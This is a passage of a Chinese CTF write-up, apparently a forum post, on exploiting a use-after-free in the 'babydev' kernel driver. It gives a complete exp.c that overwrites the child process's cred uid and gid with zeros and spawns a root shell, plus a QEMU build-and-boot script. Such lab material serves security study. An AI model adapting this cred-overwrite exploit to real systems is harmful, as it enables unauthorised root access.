
## 提权思路

- 修改该进程的`uid`、`gid`值为0
- 在该进程中以root身份执行`system('/bin/sh')`最终提权

现在回到逆向工程中，`open()`申请了一块0x40大小的内存块，`release()`存在一个uaf，而`ioctl()`将申请的内存块`free`掉，然后按用户指定的`size`再次申请，有点类似于`malloc()`和`realloc()`，那么我们就只需要得到`struct cred`的内存大小，然后造成一个悬指针即可控制`struct cred`了。

因为题目给的压缩内核镜像不带符号表，我们可以自己编译一个一样版本的内核镜像，再使用`gdb`调试计算`struct cred`大小。

![image-20220408233209678.png](https://attach.52pojie.cn/forum/202308/06/153348rvbrheydedzjwwfu.png)

`image-20220408233209678.png`（88.81 KB，下载次数：260）

附件：[下载附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMzU0OHwzYzc4YmRiMXwxNzkzNTc1ODIwfDE2ODA4NnwxNjIwMzU2&nothumb=yes)

2023-8-6 15:33 上传

## 编写 `exp.c`

编写`exp.c`如下：

```c
#include 
#include 
#include 
#include 
#include 
#include 
#include 

int main() {
  /*在用户进程空间中，当执行close(fd)之后，该进程将无法再使用这个文件描述符
   *因为题目的分配内存的指针保存在bss段babydev_struct中
   *所以alloc两个fd这样后面就可以通过修改fd2对device_buf操作
  */
    int fd1 = open("/dev/babydev", O_RDWR); // alloc1
    int fd2 = open("/dev/babydev", O_RDWR); // alloc2
    ioctl(fd1, 0x10001, 0xa8);    // realloc size -> 0xa8对应着进程cred大小
    close(fd1); // free  -> uaf

    if (!fork()) {    //注意这里采用fork()分配进程，最终会执行prepare_creds得到创建cred结构体目的
       //子进程
        char mem[28]; // 大小为sizeof(atomic_t)*2 + sizeof(void *) + sizeof(unsigned) + sizeof(kuid_t)*2 刚好覆盖到uid、gid
        memset(mem, '\x00', sizeof(mem));
        write(fd2, mem, sizeof(mem)); //覆盖数据

        // get shell
        system("/bin/sh");
    }
    else
        waitpid(-1, NULL, 0);//这里需要等待子进程，如果父进程结束那么子进程则无法在getshell后输入输出
    return 0;
}
```

最终将`exp.c`编译成可执行文件放入文件系统重新打包，内核运行`./exp`即可提权到root

![image-20220408235835525.png](https://attach.52pojie.cn/forum/202308/06/153350qfffiowl8c1ffl31.png)

`image-20220408235835525.png`（71.13 KB，下载次数：266）

附件：[下载附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMzU0OXw4ZDdiM2JmZnwxNzkzNTc1ODIwfDE2ODA4NnwxNjIwMzU2&nothumb=yes)

2023-8-6 15:33 上传

## 自动化脚本

上述的一些操作可以写成一个脚本如下：

`start.sh`

```sh
# 静态编译 exp
gcc exp.c -static -o rootfs/exp

# rootfs 打包
pushd rootfs
find . | cpio -o --format=newc > ../rootfs.cpio
popd

# 启动 qemu
sudo qemu-system-x86_64 \
    -initrd rootfs.cpio \
    -kernel bzImage \
    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
    -enable-kvm \
    -monitor /dev/null \
    -m 64M \
    --nographic  \
    -smp cores=1,threads=1 \
    -cpu kvm64,+smep \
    -s
```

## 工作目录

![image-20220409000258731.png](https://attach.52pojie.cn/forum/202308/06/153353afmm3wg3341mmf6g.png)

`image-20220409000258731.png`（45.44 KB，下载次数：260）

附件：[下载附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMzU1MHw3YzQyZTUxYnwxNzkzNTc1ODIwfDE2ODA4NnwxNjIwMzU2&nothumb=yes)

2023-8-6 15:33 上传
